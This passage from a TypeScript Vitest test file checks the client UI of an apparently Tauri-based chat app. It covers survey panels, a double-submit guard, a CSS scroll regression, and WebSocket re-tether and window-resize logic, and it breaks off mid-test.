    it('buildSurveyVerdicts maps task_quality (n=4) to score=0.75 and stamps at=issuedAt', () => {
      const items = sampleFrame().items
      const verdicts = M().buildSurveyVerdicts(items, { likert: 4, beliefAnswers: {} }, 1700)
      expect(verdicts).toHaveLength(1)
      expect(verdicts[0]).toMatchObject({
        itemId: 'tq-1',
        kind: 'task_quality',
        ref: 'task-99',
        score: 0.75,
        via: 'survey',
        at: 1700,
      })
    })

    it('buildSurveyVerdicts maps belief answers to verdict + omits unanswered beliefs', () => {
      const items = sampleFrame().items
      const verdicts = M().buildSurveyVerdicts(items, {
        likert: 1,                                                       // → score 0
        beliefAnswers: { 'belief-7': 'corrected' },                       // belief-8 unanswered
      }, 1700)
      expect(verdicts).toHaveLength(2)
      const tq = verdicts.find((v: any) => v.kind === 'task_quality')
      const bv = verdicts.find((v: any) => v.kind === 'belief_validation')
      expect(tq.score).toBe(0)
      expect(bv).toMatchObject({
        itemId: 'bv-1', beliefId: 'belief-7', verdict: 'corrected', via: 'survey', at: 1700,
      })
    })

    it('Scenario: a survey-request frame reveals the docked user-ask panel with the prompt + 5 Likert buttons + 3 belief buttons', () => {
      M().handleFrame(sampleFrame())

      const panel = document.getElementById('user-ask-panel') as HTMLElement
      expect(panel.hidden).toBe(false)

      const body = document.getElementById('user-ask-body') as HTMLElement
      const items = body.querySelectorAll('.user-ask-item')
      expect(items.length).toBe(3)

      // Task-quality row exposes 5 Likert buttons.
      const tqRow = items[0] as HTMLElement
      expect(tqRow.dataset.kind).toBe('task_quality')
      expect(tqRow.querySelectorAll('.user-ask-choice[data-likert]').length).toBe(5)

      // Each belief row exposes 3 verdict buttons keyed by beliefId.
      const bvRow = items[1] as HTMLElement
      expect(bvRow.dataset.kind).toBe('belief_validation')
      expect(bvRow.dataset.beliefId).toBe('belief-7')
      const verdictBtns = bvRow.querySelectorAll('.user-ask-choice[data-verdict]')
      expect(verdictBtns.length).toBe(3)

      // Submit is disabled until task_quality is answered.
      const submit = document.getElementById('user-ask-submit') as HTMLButtonElement
      expect(submit.disabled).toBe(true)
    })

    it('Scenario: clicking a Likert button selects it visually + enables Submit', () => {
      M().handleFrame(sampleFrame())
      const submit = document.getElementById('user-ask-submit') as HTMLButtonElement
      expect(submit.disabled).toBe(true)

      const tqRow = document.querySelectorAll('.user-ask-item')[0] as HTMLElement
      const btn3 = tqRow.querySelector('.user-ask-choice[data-likert="3"]') as HTMLButtonElement
      btn3.click()

      expect(btn3.classList.contains('selected')).toBe(true)
      expect(submit.disabled).toBe(false)
      // Other Likert buttons should NOT be selected.
      const btn1 = tqRow.querySelector('.user-ask-choice[data-likert="1"]') as HTMLButtonElement
      expect(btn1.classList.contains('selected')).toBe(false)
    })

    it('Scenario: clicking belief verdict buttons toggles single selection per belief row', () => {
      M().handleFrame(sampleFrame())
      const bv1 = document.querySelectorAll('.user-ask-item')[1] as HTMLElement
      const confirmBtn = bv1.querySelector('.user-ask-choice[data-verdict="confirmed"]') as HTMLButtonElement
      const rejectBtn  = bv1.querySelector('.user-ask-choice[data-verdict="rejected"]')  as HTMLButtonElement

      confirmBtn.click()
      expect(confirmBtn.classList.contains('selected')).toBe(true)

      rejectBtn.click()
      expect(rejectBtn.classList.contains('selected')).toBe(true)
      expect(confirmBtn.classList.contains('selected')).toBe(false)
    })

    it('Scenario: Submit sends one survey-response frame and hides the panel', () => {
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      M().handleFrame(sampleFrame())

      // Answer task_quality + one belief.
      const items = document.querySelectorAll('.user-ask-item')
      ;(items[0].querySelector('.user-ask-choice[data-likert="5"]') as HTMLButtonElement).click()
      ;(items[1].querySelector('.user-ask-choice[data-verdict="confirmed"]') as HTMLButtonElement).click()

      const submit = document.getElementById('user-ask-submit') as HTMLButtonElement
      submit.click()

      expect(sendSpy).toHaveBeenCalledTimes(1)
      const frame = sendSpy.mock.calls[0][0] as any
      expect(frame.type).toBe('survey-response')
      expect(frame.surveyId).toBe('survey-1700')
      expect(frame.issuedAt).toBe(1700)
      expect(frame.verdicts).toHaveLength(2)
      const tq = frame.verdicts.find((v: any) => v.kind === 'task_quality')
      const bv = frame.verdicts.find((v: any) => v.kind === 'belief_validation')
      expect(tq).toMatchObject({ score: 1, ref: 'task-99', at: 1700 })
      expect(bv).toMatchObject({ verdict: 'confirmed', beliefId: 'belief-7', at: 1700 })

      // Panel collapses.
      const panel = document.getElementById('user-ask-panel') as HTMLElement
      expect(panel.hidden).toBe(true)
    })

    it('Scenario: Dismiss closes the panel WITHOUT sending any wire frame', () => {
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      M().handleFrame(sampleFrame())

      const dismiss = document.getElementById('user-ask-dismiss') as HTMLButtonElement
      dismiss.click()

      expect(sendSpy).not.toHaveBeenCalled()
      const panel = document.getElementById('user-ask-panel') as HTMLElement
      expect(panel.hidden).toBe(true)
    })

    it('Scenario: Submit is a no-op when task_quality is unanswered (defence in depth past disabled button)', () => {
      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
      M().handleFrame(sampleFrame())
      // Only answer a belief — leave Likert null.
      const items = document.querySelectorAll('.user-ask-item')
      ;(items[1].querySelector('.user-ask-choice[data-verdict="rejected"]') as HTMLButtonElement).click()

      // Call submit() directly (bypassing the disabled button).
      M().SurveyEngine.submit()
      expect(sendSpy).not.toHaveBeenCalled()

      // Hint flips to error state.
      const hint = document.getElementById('user-ask-hint') as HTMLElement
      expect(hint.classList.contains('error')).toBe(true)
    })

    it('Scenario: a second survey-request replaces the first cleanly (fresh items, fresh answers)', () => {
      M().handleFrame(sampleFrame())
      // Answer the first one.
      ;(document.querySelector('.user-ask-choice[data-likert="2"]') as HTMLButtonElement).click()

      // Server pushes a NEW survey with a different issuedAt + different items.
      M().handleFrame({
        type: 'survey-request',
        surveyId: 'survey-2200',
        issuedAt: 2200,
        items: [
          { id: 'tq-9', kind: 'task_quality', prompt: 'Fresh check-in', ref: 'task-200' },
        ],
      })

      const items = document.querySelectorAll('.user-ask-item')
      expect(items.length).toBe(1)
      expect((items[0] as HTMLElement).dataset.itemId).toBe('tq-9')

      // No Likert button should be selected — answers were reset.
      const selected = document.querySelectorAll('.user-ask-choice.selected')
      expect(selected.length).toBe(0)

      // Submit is disabled again.
      const submit = document.getElementById('user-ask-submit') as HTMLButtonElement
      expect(submit.disabled).toBe(true)
    })
  })


  // ───────────────────────────────────────────────────────────────────────────
  // Feature: handleSubmit single-fire guard (no double-send)
  //
  // The user observed in production that messages from the Moon were being
  // processed multiple times. The most likely client-side amplifier is a
  // double-fire of handleSubmit (WKWebView quirks, button double-tap, or
  // future re-wiring). These tests pin a microtask-scoped single-fire guard
  // in place: no matter how many times handleSubmit is invoked synchronously
  // for the same user action, exactly ONE user-message frame goes on the wire.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: handleSubmit single-fire guard', () => {
    const M = () => (window as any).__MoonInternals

    const setActiveThread = (id: string) => {
      // thread-created sets activeThreadId without needing a live ws.
      M().handleFrame({ type: 'thread-created', thread: { id } })
    }

    const userMessageSends = (spy: any) =>
      spy.mock.calls.filter((c: any[]) => (c[0] as any).type === 'user-message')

    beforeEach(() => {
      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => { cb(0); return 1 }
      ;(window as any).cancelAnimationFrame = () => {}
      // Reset chat state + textarea so the suite is independent.
      const m = M()
      if (m?.ChatState?.reset) m.ChatState.reset()
      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      if (ta) ta.value = ''
    })

    it('Scenario: a single Enter keypress in the textarea fires exactly ONE user-message frame', () => {
      const m = M()
      setActiveThread('thread-A')
      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})

      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      ta.value = 'hi luna'
      ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true }))

      expect(userMessageSends(sendSpy).length).toBe(1)
    })

    it('Scenario: a single form-submit fires exactly ONE user-message frame', () => {
      const m = M()
      setActiveThread('thread-A')
      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})

      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      ta.value = 'hi luna'
      document.getElementById('chat-form')!.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }))

      expect(userMessageSends(sendSpy).length).toBe(1)
    })

    it('Scenario: keydown Enter IMMEDIATELY followed by a synthetic form-submit fires exactly ONE user-message frame (WKWebView implicit-submission defence)', () => {
      const m = M()
      setActiveThread('thread-A')
      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})

      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      ta.value = 'hi luna'
      // Simulate the worst case: both event paths fire from a single key press.
      ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true }))
      document.getElementById('chat-form')!.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }))

      expect(userMessageSends(sendSpy).length).toBe(1)
    })

    it('Scenario: calling ChatEngine.handleSubmit() synchronously twice fires exactly ONE user-message frame', () => {
      const m = M()
      setActiveThread('thread-A')
      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})

      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      ta.value = 'hi luna'
      const evtA = new Event('submit', { bubbles: true, cancelable: true })
      const evtB = new Event('submit', { bubbles: true, cancelable: true })
      // Direct synchronous double-call (the failure mode the microtask guard
      // covers — fires that the empty-textarea downstream check could miss
      // for e.g. attachment-only sends or the no-active-thread branch).
      m.ChatEngine.handleSubmit(evtA)
      m.ChatEngine.handleSubmit(evtB)

      expect(userMessageSends(sendSpy).length).toBe(1)
    })

    it('Scenario: two intentional submits separated by a microtask DO both fire (guard self-clears)', async () => {
      const m = M()
      setActiveThread('thread-A')
      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})

      const ta = document.getElementById('message-input') as HTMLTextAreaElement
      ta.value = 'first'
      document.getElementById('chat-form')!.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }))
      // queueMicrotask in handleSubmit clears the flag; wait one microtask.
      await Promise.resolve()
      ta.value = 'second'
      document.getElementById('chat-form')!.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }))

      const sends = userMessageSends(sendSpy)
      expect(sends.length).toBe(2)
      expect((sends[0][0] as any).text).toBe('first')
      expect((sends[1][0] as any).text).toBe('second')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Long-running turn timeline stays scrollable
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Long-running turn timeline stays scrollable (regression)', () => {
    // Layout regression guard. jsdom does NO layout, so we can't measure
    // scrollHeight/clientHeight here — this pins the CSS rule that fixes the bug.
    //
    // Bug: `.chat-messages` is `flex:1` AND a column flex container. Its children
    // default to flex-shrink:1, and a `.timeline` sets `overflow:hidden` (which
    // gives it an automatic minimum size of 0 per CSS Flexbox §4.5). So on a long
    // agentic turn, flexbox COMPRESSED the streaming timeline down to its one-line
    // "Working on it…" summary — clipping every tool step inside it and making
    // scrollHeight == clientHeight, so .chat-messages could not scroll at all.
    // The content was rendered but unreachable. Fix: pin the direct children to
    // flex-shrink:0 so each keeps its natural height and the overflow scrolls.
    // (Reproduced + fix verified in both WebKit and Blink via a Playwright layout
    // probe driving the real handleFrame pipeline; see the PR description.)
    //
    // We can't measure layout in jsdom, but jsdom DOES resolve getComputedStyle
    // through the `> *` combinator, so we assert the EFFECTIVE flex-shrink a real
    // direct child of `.chat-messages` would compute. This is cascade-aware (a
    // later rule that reset flex-shrink fails this), formatting-agnostic, and
    // robust to the stylesheet being split across multiple <style> blocks —
    // unlike a text/regex match.
    it('Scenario: a direct child of .chat-messages computes flex-shrink:0 (cannot be compressed away)', () => {
      // Pull EVERY <style> block out of the source and apply them all.
      const css = [...htmlContent.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/g)]
        .map((m) => m[1])
        .join('\n')
      const styleEl = document.createElement('style')
      styleEl.textContent = css
      document.head.appendChild(styleEl)
      const probe = document.createElement('div')
      probe.innerHTML =
        '<div class="chat-messages"><div class="msg assistant" id="__flexshrink_probe__">x</div></div>'
      document.body.appendChild(probe)
      try {
        const child = document.getElementById('__flexshrink_probe__')!
        expect(getComputedStyle(child).flexShrink).toBe('0')
      } finally {
        styleEl.remove()
        probe.remove()
      }
    })
  })

  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: re-tether reattach correctness (the network behavior the moon's
  // "string" drives). Subscribe watchdog, in-memory thread preference over the
  // on-disk file, and restart-survival persistence. No physics here (jsdom).
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: re-tether reattach correctness', () => {
    const M = () => (window as any).__MoonInternals

    // The shared beforeEach Tauri mock has no `core.invoke`; give each test one.
    const stubInvoke = (impl?: (cmd: string, args?: any) => any) => {
      const invoke = vi.fn(impl ?? (() => Promise.resolve(null)))
      ;(window as any).__TAURI__.core = { invoke }
      return invoke
    }
    const fakeOpenSocket = () => ({ readyState: WebSocket.OPEN, send: vi.fn() })

    it('Scenario: syncThread prefers the in-memory thread over the Tauri last-thread file', async () => {
      const m = M()
      const invoke = stubInvoke(() => Promise.resolve('file-thread'))
      m.State.activeThreadId = 'live-thread'
      m.State.skipLastThreadFile = false
      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})

      await m.WebSocketEngine.syncThread()

      expect(invoke).not.toHaveBeenCalled() // never touched the disk file
      expect(sendSpy).toHaveBeenCalledWith({ type: 'subscribe', threadId: 'live-thread' })
    })

    it('Scenario: syncThread falls back to the Tauri last-thread file on a cold start', async () => {
      const m = M()
      const invoke = stubInvoke((cmd) =>
        Promise.resolve(cmd === 'get_last_thread_id' ? 'file-thread' : null),
      )
      m.State.activeThreadId = null
      m.State.skipLastThreadFile = false
      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})

      await m.WebSocketEngine.syncThread()

      expect(invoke).toHaveBeenCalledWith('get_last_thread_id')
      expect(sendSpy).toHaveBeenCalledWith({ type: 'subscribe', threadId: 'file-thread' })
    })

    it('Scenario: a server switch ignores BOTH the stale in-memory id and the file, listing fresh', async () => {
      const m = M()
      const invoke = stubInvoke(() => Promise.resolve('file-thread'))
      m.State.activeThreadId = 'stale-old-server-thread'
      m.State.skipLastThreadFile = true
      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})

      await m.WebSocketEngine.syncThread()

      expect(invoke).not.toHaveBeenCalled()
      expect(sendSpy).toHaveBeenCalledWith({ type: 'list-threads' })
      expect(m.State.skipLastThreadFile).toBe(false) // one-shot guard consumed
    })

    it('Scenario: the subscribe watchdog fires onReattachStalled when no snapshot arrives', () => {
      const m = M()
      stubInvoke()
      // Neutralize any pending auto-reconnect so connGen cannot shift under us.
      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
      m.State.ws = fakeOpenSocket() // socket is fine; only the thread is missing
      const stalled = vi.spyOn(m.WebSocketEngine, 'onReattachStalled').mockImplementation(() => {})

      m.WebSocketEngine.startSubscribeTimeout()
      expect(m.State.subscribeTimeout).not.toBeNull()

      vi.advanceTimersByTime(7000)

      expect(stalled).toHaveBeenCalledTimes(1)
      expect(m.State.subscribeTimeout).toBeNull()
    })

    it('Scenario: a thread-snapshot cancels the watchdog (success is not treated as stalled)', () => {
      const m = M()
      stubInvoke()
      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
      m.State.ws = fakeOpenSocket()
      m.State.activeThreadId = 'thread-xyz'
      const stalled = vi.spyOn(m.WebSocketEngine, 'onReattachStalled').mockImplementation(() => {})

      m.WebSocketEngine.startSubscribeTimeout()
      m.handleFrame({ type: 'thread-snapshot', messages: [] })
      expect(m.State.subscribeTimeout).toBeNull()

      vi.advanceTimersByTime(7000)
      expect(stalled).not.toHaveBeenCalled()
    })

    it('Scenario: a thread-snapshot persists the thread id for restart-survival', () => {
      const m = M()
      const invoke = stubInvoke()
      m.State.ws = fakeOpenSocket()
      m.State.activeThreadId = 'thread-xyz'

      m.handleFrame({ type: 'thread-snapshot', messages: [] })

      expect(invoke).toHaveBeenCalledWith('set_last_thread_id', { threadId: 'thread-xyz' })
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: single-thread controls. The "+ new chat" satellite is gone (Luna is
  // single-thread); the rare reset moves into Settings → General.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: single-thread controls (removed "+", Settings reset)', () => {
    const M = () => (window as any).__MoonInternals

    it('Scenario: the "+ new chat" satellite is gone; Settings has the reset instead', () => {
      expect(document.getElementById('new-chat')).toBeNull()
      expect(document.getElementById('fresh-thread-btn')).not.toBeNull()
    })

    it('Scenario: "Start a fresh thread" clears the active thread and closes Settings', () => {
      const m = M()
      document.getElementById('chat-panel')!.classList.add('active') // skip the async open branch
      document.getElementById('toggle-settings')!.dispatchEvent(new MouseEvent('click', { bubbles: true }))
      expect(document.getElementById('settings-panel')!.classList.contains('active')).toBe(true)

      m.State.activeThreadId = 'old-thread'
      document.getElementById('fresh-thread-btn')!.dispatchEvent(new MouseEvent('click', { bubbles: true }))

      expect(m.State.activeThreadId).toBeNull() // newConversation() ran
      expect(document.getElementById('settings-panel')!.classList.contains('active')).toBe(false) // close() ran
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: re-tether swing envelope. The window grows + re-origins so the moon
  // stays visually fixed while the bead gets room to fling. The Tauri window
  // calls are operator-verify; here we pin the COORDINATE MATH (incl. Retina
  // logical-px + screen-edge clamp + moon-CSS compensation) with a mocked window.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: re-tether swing envelope (window math)', () => {
    const M = () => (window as any).__MoonInternals
    const mockWin = (originX: number, originY: number, sf = 1) => {
      const setPosition = vi.fn().mockResolvedValue(undefined)
      const setSize = vi.fn().mockResolvedValue(undefined)
      const win = {
        scaleFactor: vi.fn().mockResolvedValue(sf),
        outerPosition: vi.fn().mockResolvedValue({ toLogical: () => ({ x: originX, y: originY }) }),
        currentMonitor: vi.fn().mockResolvedValue({
          position: { toLogical: () => ({ x: 0, y: 0 }) },
          size: { toLogical: () => ({ width: 1440, height: 900 }) },
        }),
        setPosition, setSize,
      }
      ;(window as any).__TAURI__.window.getCurrentWindow = () => win
      ;(window as any).__TAURI__.window.LogicalPosition = class { x: number; y: number; constructor(x: number, y: number) { this.x = x; this.y = y } }
      return { setPosition, setSize }
    }

    it('Scenario: growToEnvelope keeps the moon visually fixed (origin shift cancels the moon re-center)', async () => {
      const { setPosition, setSize } = mockWin(300, 200)
      await M().TauriService.growToEnvelope()
      const moon = document.getElementById('moon')!
      const pos = setPosition.mock.calls[0][0]
      // moon screen = (315,215); envelope centres the moon at window-local (175,15)
      expect({ x: pos.x, y: pos.y }).toEqual({ x: 140, y: 200 }) // 315-175, 215-15
      expect(moon.style.left).toBe('175px')
      expect(moon.style.top).toBe('15px')
      // THE invariant: newOrigin + moonCss === old moon screen position (no jump)
      expect(pos.x + parseFloat(moon.style.left)).toBe(315)
      expect(pos.y + parseFloat(moon.style.top)).toBe(215)
      expect(setSize).toHaveBeenCalledWith(expect.objectContaining({ width: 460, height: 470 }))
      expect(document.body.classList.contains('retethering')).toBe(true)
    })

    it('Scenario: a moon jammed at the screen edge clamps on-screen and compensates the moon CSS', async () => {
      const { setPosition } = mockWin(5, 200) // near the left edge
      await M().TauriService.growToEnvelope()
      const moon = document.getElementById('moon')!
      const pos = setPosition.mock.calls[0][0]
      // moon screen = (20,215); desired origin 20-175=-155 → clamped to 0; moon CSS compensates to 20
      expect(pos.x).toBe(0)
      expect(parseFloat(moon.style.left)).toBe(20)
      expect(pos.x + parseFloat(moon.style.left)).toBe(20) // screen position still preserved
    })

    it('Scenario: restoreCollapsed returns the moon to 140x185 at its original screen spot', async () => {
      // First grow (moon at screen 315,215 → envelope), then restore.
      mockWin(300, 200)
      await M().TauriService.growToEnvelope()
      const moon = document.getElementById('moon')!
      // After grow, window origin is (140,200) and moon CSS (175,15) → screen (315,215).
      const { setPosition, setSize } = mockWin(140, 200) // outerPosition now reports the grown origin
      // re-point the moon CSS to what grow left it as (mockWin doesn't touch the DOM)
      moon.style.left = '175px'; moon.style.top = '15px'
      await M().TauriService.restoreCollapsed()
      const pos = setPosition.mock.calls[0][0]
      // moon screen still (315,215); collapsed moon CSS = (15,15) → origin (300,200)
      expect({ x: pos.x, y: pos.y }).toEqual({ x: 300, y: 200 })
      expect(moon.style.left).toBe('') // back to CSS default 15
      expect(setSize).toHaveBeenCalledWith(expect.objectContaining({ width: 140, height: 185 }))
      expect(document.body.classList.contains('retethering')).toBe(false)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: re-tether state machine. Drives the string from the connection
  // lifecycle: pull → reconnect to the SAME thread; detached-past-grace / stalled
  // → drop the string (collapsed-only); thread-snapshot → retract + restore.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: re-tether state machine', () => {
    const M = () => (window as any).__MoonInternals

    it('Scenario: pull with the socket DOWN bypasses backoff, cancels the pending reconnect, and connects', () => {
      const m = M()
      m.State.ws = null
      m.State.reconnectAttempts = 5
      m.State.reconnectTimer = 123 // a pending scheduleReconnect timer
      const connect = vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
      m.WebSocketEngine.reTether()
      expect(m.State.reconnectAttempts).toBe(0)
      expect(connect).toHaveBeenCalledTimes(1)
      expect(m.State.reconnectTimer).toBeNull() // no orphaned second socket
    })

    it('Scenario: pull with the socket OPEN re-subscribes to the SAME thread (never new-thread)', () => {
      const m = M()
      m.State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
      m.State.activeThreadId = 'thread-keep'
      const send = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})
      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
      m.WebSocketEngine.reTether()
      expect(send).toHaveBeenCalledWith({ type: 'subscribe', threadId: 'thread-keep' })
      expect(send).not.toHaveBeenCalledWith({ type: 'new-thread' })
      expect(m.State.subscribeTimeout).not.toBeNull() // watchdog re-armed
    })

    it('Scenario: showTether drops the string when collapsed (grow envelope → show)', async () => {
      const m = M()
      document.getElementById('chat-panel')!.classList.remove('active')
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
      const grow = vi.spyOn(m.TauriService, 'growToEnvelope').mockResolvedValue(undefined)
      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})
      m.WebSocketEngine.showTether()
      expect(grow).toHaveBeenCalledTimes(1)
      await Promise.resolve(); await Promise.resolve() // flush the .then(show)
      expect(show).toHaveBeenCalledTimes(1)
      expect(m.State.tetherPendingOnCollapse).toBe(false)
    })

    it('Scenario: showTether DEFERS while the chat is open (string is collapsed-only)', () => {
      const m = M()
      document.getElementById('chat-panel')!.classList.add('active')
      const grow = vi.spyOn(m.TauriService, 'growToEnvelope').mockResolvedValue(undefined)
      m.WebSocketEngine.showTether()
      expect(grow).not.toHaveBeenCalled()
      expect(m.State.tetherPendingOnCollapse).toBe(true)
    })

    it('Scenario: a reconnect landing mid-grow abandons the string AND restores the window (tetherGen epoch)', async () => {
      const m = M()
      document.getElementById('chat-panel')!.classList.remove('active')
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
      // growToEnvelope() resolves only when WE say so — this models the several-IPC
      // round-trip gap during which a background reconnect can succeed.
      let resolveGrow: () => void = () => {}
      const grow = vi
        .spyOn(m.TauriService, 'growToEnvelope')
        .mockReturnValue(new Promise<void>((r) => { resolveGrow = r }))
      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})

      m.WebSocketEngine.showTether()          // arms the grow, stamps tetherGen
      expect(grow).toHaveBeenCalledTimes(1)

      // reconnect wins the race. onReattached suspends at `await growPromise`, so it
      // must NOT be awaited before we resolve the grow (that would deadlock).
      const reattached = m.WebSocketEngine.onReattached()
      expect(restore).not.toHaveBeenCalled()  // restore is sequenced AFTER the grow settles
      resolveGrow()                           // grow finishes a beat too late
      await reattached                         // → grow settled → restore awaited
      expect(show).not.toHaveBeenCalled()     // string abandoned, not popped out post-reconnect
      expect(restore).toHaveBeenCalledTimes(1) // ...and the window was collapsed back (no orphan)
    })

    it('Scenario: a NEW tether episode during cleanup is not clobbered (epoch guards the restore)', async () => {
      const m = M()
      document.getElementById('chat-panel')!.classList.remove('active')
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
      vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})
      let resolveGrow1: () => void = () => {}
      vi.spyOn(m.TauriService, 'growToEnvelope')
        .mockReturnValueOnce(new Promise<void>((r) => { resolveGrow1 = r })) // episode 1 (pending)
        .mockReturnValue(Promise.resolve())                                  // episode 2 grow
      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)

      m.WebSocketEngine.showTether()           // episode 1 grow (pending)
      const reattached = m.WebSocketEngine.onReattached() // suspends awaiting episode-1 grow
      m.WebSocketEngine.showTether()           // a fresh disconnect → episode 2 → bumps tetherGen
      resolveGrow1()                           // episode-1 grow finally settles
      await reattached
      expect(restore).not.toHaveBeenCalled()   // episode 1's restore stood down; episode 2 owns the window
    })

    it('Scenario: opening the chat ENDS the tether episode — a later reconnect cannot shrink the OPEN chat (regression)', async () => {
      const m = M()
      document.getElementById('chat-panel')!.classList.remove('active')
      // Live-state tracked through the real show/hideImmediate call order, so the
      // chat-open teardown path is exercised exactly as production wires it.
      let live = false
      vi.spyOn(m.MoonString, 'isLive').mockImplementation(() => live)
      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => { live = true })
      vi.spyOn(m.MoonString, 'hideImmediate').mockImplementation(() => { live = false })
      vi.spyOn(m.TauriService, 'growToEnvelope').mockResolvedValue(undefined)
      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)

      m.WebSocketEngine.showTether()           // string drops while collapsed
      await Promise.resolve(); await Promise.resolve()
      expect(show).toHaveBeenCalledTimes(1)    // grow settled → string is out

      // User opens the chat while the string is out (quick moon click).
      const moon = document.getElementById('moon')!
      moon.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 }))
      vi.advanceTimersByTime(50)
      moon.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 }))
      for (let i = 0; i < 10; i++) await Promise.resolve() // flush toggleChat's await chain
      expect(document.getElementById('chat-panel')!.classList.contains('active')).toBe(true)
      expect(restore).toHaveBeenCalledTimes(1) // teardown restored the envelope as part of the open
      expect(m.State.growPromise).toBeNull()   // episode bookkeeping fully cleared

      // The background reconnect lands AFTER the chat is open. Before the fix, the
      // dangling growPromise made this replay restoreCollapsed() — shrinking the
      // user's open chat window to 140x185 mid-use.
      restore.mockClear()
      await m.WebSocketEngine.onReattached()
      expect(restore).not.toHaveBeenCalled()
    })

    it('Scenario: opening the chat MID-GROW abandons the deferred string (no string pop over the open chat)', async () => {
      const m = M()
      document.getElementById('chat-panel')!.classList.remove('active')
      let live = false
      vi.spyOn(m.MoonString, 'isLive').mockImplementation(() => live)
      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => { live = true })
      vi.spyOn(m.MoonString, 'hideImmediate').mockImplementation(() => { live = false })
      let resolveGrow: () => void = () => {}
      vi.spyOn(m.TauriService, 'growToEnvelope')
        .mockReturnValue(new Promise<void>((r) => { resolveGrow = r }))
      vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)

      m.WebSocketEngine.showTether()           // grow in flight; string NOT yet shown

      // User opens the chat before the grow settles. The open path must bump the
      // epoch so the deferred MoonString.show() stands down — before the fix the
      // teardown branch was skipped entirely (isLive() still false) and the string
      // popped out OVER the open chat once the grow resolved.
      const moon = document.getElementById('moon')!
      moon.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 }))
      vi.advanceTimersByTime(50)
      moon.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 }))
      for (let i = 0; i < 10; i++) await Promise.resolve()

      resolveGrow()                            // grow finally settles, a beat too late
      for (let i = 0; i < 10; i++) await Promise.resolve()
      expect(document.getElementById('chat-panel')!.classList.contains('active')).toBe(true)
      expect(show).not.toHaveBeenCalled()       // deferred show abandoned (epoch bumped)
      expect(m.State.growPromise).toBeNull()
      expect(m.State.tetherPendingOnCollapse).toBe(true) // string returns on the next collapse
    })

    it('Scenario: a thread-snapshot retracts a live string (with pulse) and clears the grace timer', () => {
      const m = M()
      ;(window as any).__TAURI__.core = { invoke: vi.fn().mockResolvedValue(undefined) }
      m.State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
      m.State.activeThreadId = 'abc'
      m.State.tetherGraceTimer = 999
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(true)
      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
      m.handleFrame({ type: 'thread-snapshot', messages: [] })
      expect(retract).toHaveBeenCalledWith(true)
      expect(m.State.tetherGraceTimer).toBeNull()
      expect(document.getElementById('connection-status')!.className).toBe('connected')
    })

    it('Scenario: a PULL wraps the string into the moon IMMEDIATELY — retract fires before any thread-snapshot (string-demo behavior)', () => {
      const m = M()
      m.State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
      m.State.activeThreadId = 'thread-keep'
      m.State.growPromise = Promise.resolve()  // the showTether grow that put the string out
